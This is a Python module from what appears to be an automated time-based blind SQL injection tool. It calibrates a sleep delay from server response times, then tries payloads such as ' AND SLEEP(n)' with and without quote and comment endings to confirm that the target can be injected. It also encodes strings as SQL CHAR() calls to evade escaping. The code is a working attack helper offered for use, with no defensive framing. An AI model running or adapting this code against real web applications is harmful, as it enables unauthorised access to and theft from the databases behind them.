import math
import requests

from my_request import *
#OPTIMIZATION OF SLEEP TIME: It makes 12 resquest and than it calculates the average time without considering the two largest values
def compute_sleep_time(my_attack):
	
	res_sum = 0.00 
	sample = []
	for i in range(12):
		res = request(my_attack, "")
		if(not(res == 'REQUEST ERROR')):
			#print(res.elapsed.total_seconds())
			sample.insert(i,res.elapsed.total_seconds())
		else:
			print('REQUEST ERROR')
	
	sample.sort()
	sample.reverse()
	avg = (sum(sample)-sample[0]-sample[1])/10.0
	if (avg<0.5):
		return 1.0
	else:
		return math.floor(avg*2)

#TEST INJECTION: It considers three possible case: with comments( -- -), whith quote( ' ) and with nothing
def injection_test(my_attack):
	
	test_payload = " AND SLEEP(%g)" % my_attack.sleep_time
	
	print("\nI am checking that the injection works.")
	if(my_attack.show_payload):	
		print("Attempt 1. PAYLOAD:\t\t" + my_attack.known_value + test_payload)
	res = request(my_attack, test_payload)
	
	res_elapsed = res.elapsed.total_seconds()
	
	if (res_elapsed >= my_attack.sleep_time):
		print("\nDone! INJECTION WORKS!\n")
		return True

	else:
		test_payload = " AND SLEEP(%g) -- -" % my_attack.sleep_time
		
		print("I'm considering more ways...")
		if(my_attack.show_payload):
			print("Attempt 2. first attempt PAYLOAD:\t\t" + my_attack.known_value + test_payload)
		res = request(my_attack, test_payload)
	
		res_elapsed = res.elapsed.total_seconds()
		if (res_elapsed >= my_attack.sleep_time):
			my_attack.set_comments_needed(True)
			print("\nDone! INJECTION WORKS!\n")
			return True
		
		else:
			test_payload = "' AND SLEEP(%g) -- -" % my_attack.sleep_time
		
			print("I'm considering more ways...")
			if(my_attack.show_payload):
				print("Attempt 3. PAYLOAD:\t\t" + my_attack.known_value + test_payload)
			res = request(my_attack, test_payload)
	
			res_elapsed = res.elapsed.total_seconds()
			if (res_elapsed >= my_attack.sleep_time):
				my_attack.set_comments_needed(True)
				my_attack.set_quote_needed(True)
				print("\nDone! INJECTION WORKS!\n")
				return True
		
		return False
	
#It turns a string into a sequence of ASCII values and it returns a string (to inject) with the invers function in SQL language
def bypass_escape(my_string):
	my_string_chars = list(my_string)
	result = "CHAR("
	for i in range(len(my_string_chars)):
		if(i == len(my_string_chars)-1):
			result = result + str(ord(my_string_chars[i]))
		else:
			result = result + str(ord(my_string_chars[i])) + ","
	
	result = result + ")"
	return result
	

def choice_menu( choose_text, found_names_list ):
	for i in range(len(found_names_list)):
		menu_element = str(i)+" "+found_names_list[i]+"\n"
		choose_text = choose_text + menu_element

	check_choice=False
	while(not check_choice):
		choice=input(choose_text + ">>>")
		if( choice.isdigit() and int(choice)<len(found_names_list) and int(choice) >= 0 ):
			check_choice=True
	
	return choice
